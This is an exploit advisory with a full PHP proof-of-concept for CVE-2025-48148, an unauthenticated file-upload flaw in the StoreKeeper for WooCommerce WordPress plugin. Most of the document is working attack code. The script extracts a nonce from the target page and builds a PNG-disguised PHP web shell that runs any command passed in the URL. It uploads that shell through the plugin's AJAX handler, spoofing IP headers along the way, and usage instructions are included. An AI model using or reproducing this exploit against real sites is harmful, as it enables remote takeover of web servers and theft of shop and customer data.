@@ -1,0 +1,209 @@
+=============================================================================================================================================
+| # Title     : WordPress StoreKeeper for WooCommerce 14.4.4 Remote Code Execution via File Upload                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/storekeeper-for-woocommerce/                                                                  |
+=============================================================================================================================================
+
+POC : 
+
+[+] References : https://packetstorm.news/files/id/210872/ & 	CVE-2025-48148 
+
+[+] Summary    : A critical security vulnerability exists in the StoreKeeper for WooCommerce WordPress plugin that allows unauthenticated attackers to upload arbitrary files, including PHP web shells, leading to complete system compromise.
+
+[+]  Risk Assessment :
+
+- **Attack Vector**: Network-based, no authentication required
+- **Attack Complexity**: Low
+- **Privileges Required**: None
+- **User Interaction**: None
+
+The vulnerability stems from improper nonce validation and missing authorization checks in the `upload_product_image` AJAX handler.
+
+[+] Usage: 
+
+Usage: php poc.php -u <url> [--debug]
+
+Example: php poc.php -u http://site.com/ [--debug]
+
+[+] POC :
+
+<?php
+
+class NxploitedShellUploader {
+    private $logger;
+    private $timeout = 10;
+    
+    public function __construct($debug = false) {
+        $this->setupLogger($debug);
+    }
+    
+    private function setupLogger($debug) {
+        $this->logger = function($message, $level = 'INFO') {
+            $timestamp = date('Y-m-d H:i:s');
+            echo "[$timestamp] [$level] $message\n";
+        };
+    }
+    
+    private function log($message, $level = 'INFO') {
+        call_user_func($this->logger, $message, $level);
+    }
+    
+    public function getNonce($site_url) {
+        $headers = [
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "Accept: */*",
+            "Connection: close",
+            "Referer: " . $site_url,
+            "X-Forwarded-For: 127.0.0.1",
+            "X-Originating-IP: 127.0.0.1",
+            "X-Remote-IP: 127.0.0.1",
+            "X-Remote-Addr: 127.0.0.1"
+        ];
+        
+        $this->log("Requesting site for nonce extraction...");
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $site_url,
+            CURLOPT_HTTPHEADER => $headers,
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_RETURNTRANSFER => true
+        ]);
+        
+        $response = curl_exec($ch);
+        $error = curl_error($ch);
+        curl_close($ch);
+        
+        if ($error) {
+            $this->log("Error fetching URL: $error", 'ERROR');
+            exit(1);
+        }
+        
+        if (preg_match('/"nonce":"([a-f0-9]+)"/', $response, $matches)) {
+            $nonce_val = $matches[1];
+            $this->log("Nonce extracted: $nonce_val");
+            return $nonce_val;
+        }
+        
+        $this->log("Nonce not found!", 'ERROR');
+        exit(1);
+    }
+    
+    public function writeShell($filename = "indoushka.php") {
+        $shell_content = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>";
+        
+        if (file_put_contents($filename, $shell_content) !== false) {
+            $this->log("Shell file created: $filename");
+            return true;
+        } else {
+            $this->log("Failed to create shell file: $filename", 'ERROR');
+            return false;
+        }
+    }
+    
+    public function uploadShell($site_url, $nonce, $shell_path) {
+        $base = rtrim(explode('/wp-admin/', $site_url)[0], '/');
+        $ajax_url = $base . "/wp-admin/admin-ajax.php";
+        
+        $this->log("Uploading shell to $ajax_url ...");
+        
+        if (!file_exists($shell_path)) {
+            $this->log("Shell file not found: $shell_path", 'ERROR');
+            exit(1);
+        }
+        
+        $post_data = [
+            'action' => 'upload_product_image',
+            'nonce' => $nonce,
+            'file' => new CURLFile($shell_path, 'image/png', 'indoushka.php')
+        ];
+        
+        $headers = [
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
+            "Referer: " . $site_url,
+            "X-Requested-With: XMLHttpRequest",
+            "Accept: */*",
+            "Connection: close",
+            "X-Forwarded-For: 127.0.0.1",
+            "X-Originating-IP: 127.0.0.1",
+            "X-Remote-IP: 127.0.0.1",
+            "X-Remote-Addr: 127.0.0.1",
+            "Pragma: no-cache",
+            "Cache-Control: no-cache"
+        ];
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $ajax_url,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $post_data,
+            CURLOPT_HTTPHEADER => $headers,
+            CURLOPT_TIMEOUT => 15,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_RETURNTRANSFER => true
+        ]);
+        
+        $response = curl_exec($ch);
+        $error = curl_error($ch);
+        curl_close($ch);
+        
+        if ($error) {
+            $this->log("Upload failed: $error", 'ERROR');
+            exit(1);
+        }
+        
+        $this->log("Upload response:");
+        echo $response . "\n";
+        
+        return $response;
+    }
+    
+    public function execute($url, $debug = false) {
+        if ($debug) {
+            $this->log("Debug logging enabled", 'DEBUG');
+        }
+        
+        try {
+            $nonce = $this->getNonce($url);
+            $this->writeShell("indoushka.php");
+            $this->uploadShell($url, $nonce, "indoushka.php");
+            $this->log("Operation completed.");
+        } catch (Exception $e) {
+            $this->log("Operation failed: " . $e->getMessage(), 'ERROR');
+            exit(1);
+        }
+    }
+}
+
+if (php_sapi_name() === 'cli') {
+    $options = getopt("u:", ["url:", "debug"]);
+    
+    $url = $options['u'] ?? $options['url'] ?? null;
+    $debug = isset($options['debug']);
+    
+    if (!$url) {
+        echo "Usage: php exploit.php -u <url> [--debug]\n";
+        echo "Example: php exploit.php -u http://site.com/ [--debug]\n";
+        exit(1);
+    }
+    
+    $uploader = new NxploitedShellUploader($debug);
+    $uploader->execute($url, $debug);
+} else {
+    echo "This script is intended for command line use only.\n";
+}
+
+if (function_exists('curl_version')) {
+ 
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
